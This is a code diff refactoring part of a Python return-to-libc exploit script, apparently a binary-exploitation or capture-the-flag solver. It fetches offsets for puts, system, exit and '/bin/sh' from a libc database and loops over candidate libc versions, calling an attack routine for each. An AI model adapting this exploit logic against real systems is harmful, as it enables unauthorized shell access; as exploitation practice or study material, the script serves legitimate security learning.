@@ -80,18 +80,8 @@ def get_libc_symbol_offsets(libc_id):
     Retrieves offsets for essential libc symbols: 'puts', 'system', 'exit', 'str_bin_sh'.
     """
     libc_url = f"{LIBC_SEARCH_URL}{libc_id['id']}"
-    
-    # Request these symbols from the database
-    symbols_of_interest = ["puts", "system", "exit", "str_bin_sh"]
-    response = requests.post(libc_url, headers=HEADERS, json={"symbols": symbols_of_interest})
-    symbol_offsets = response.json().get('symbols', {})
-
-    log.info(f"Trying offsets for libc version: {libc_id}")
-    for symbol in symbols_of_interest:
-        log.info(f"Offset - {symbol}: {symbol_offsets.get(symbol)}")
-
-    # Return the offsets as a tuple, in the same order as requested
-    return tuple(symbol_offsets.get(symbol) for symbol in symbols_of_interest)
+    response = requests.post(libc_url, headers=HEADERS, json={"symbols": ["puts", "system", "exit", "str_bin_sh"]})
+    return response.json().get('symbols', {})
 
 
 def skip_lines(proc, lines):
@@ -121,12 +111,8 @@ def main():
 
     # Loop through each potential libc version to attempt exploitation
     for libc in potential_libcs:
-        # Retrieve offsets for essential libc symbols: 'puts', 'system', 'exit', 'str_bin_sh'
-        puts_off, system_off, exit_off, binsh_off = get_libc_symbol_offsets(libc)
-
-        # Convert offsets from hexadecimal strings to integers
-        puts_off, system_off, exit_off, binsh_off = \
-            int(puts_off, 16), int(system_off, 16), int(exit_off, 16), int(binsh_off, 16)
+        offsets = get_libc_symbol_offsets(libc)
+        puts_off, system_off, exit_off, binsh_off = (int(offsets[sym], 16) for sym in ["puts", "system", "exit", "str_bin_sh"])
 
         # Attempt return-to-libc attack with the current libc version's offsets
         ret_val = attempt_r2libc(puts_off, system_off, exit_off, binsh_off)
